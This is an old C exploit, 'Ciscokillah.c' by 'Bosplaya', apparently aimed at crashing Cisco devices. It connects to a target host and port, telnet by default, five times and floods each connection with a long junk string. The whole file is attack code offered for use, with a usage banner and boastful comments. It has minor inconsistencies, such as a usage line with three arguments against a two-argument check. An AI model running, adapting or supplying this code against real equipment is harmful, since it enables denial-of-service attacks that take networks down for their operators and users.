/* Written by Bosplaya "nobody would give me a sploit, had to write mah own"
 * 9x  - The Only Group That Doesnt Claim To Own You
 * 2/20/98
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

#define dport 23  /* The port we want :)*/

int x, s, i, p;
char *str = "45646545646465465465fsdfdsfdsfdsf46465454665465465456456465465456465465465456464654654564564564564564564654654564654654654564654464656464654456654unFunF454646465465465465465456456465456465456456465456456321313132132123132123123132123132123132132132123132123123154654645646464464";
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;


int open_sock(int sock, char *server, int port) {
     struct sockaddr_in blah;
     struct hostent *he;
     bzero((char *)&blah,sizeof(blah));
     blah.sin_family=AF_INET;
     blah.sin_addr.s_addr=inet_addr(server);
     blah.sin_port=htons(port);
                              
    if ((he = gethostbyname(server)) != NULL) {
        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
    }
    else {
         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
           perror("gethostbyname()");
           return(-3);
         }
    }
    
        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
             perror("connect()");
             close(sock);
             return(-4);
        }
}

void main(int argc, char *argv[]) {
     int t;
     if (argc !=  3) {
       printf("Ciscokillah.c by Bosplaya\n\n");
       printf("Usage: %s <target> <port> <incase they try to hide it> \n",argv[0]);
       exit(0);
     }
     for (t=0; t<5; t++)
     {
     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        perror("socket()");
        exit(-1);
     }
     p = atoi(argv[2]);
     open_sock(s,argv[1],p);
                                              
     for (i=0; i<10; i++) {
       send(s,str,strlen(str),0x0);
     }
     printf("uNF\n");
     }
     close(s);
     }
                                                                              



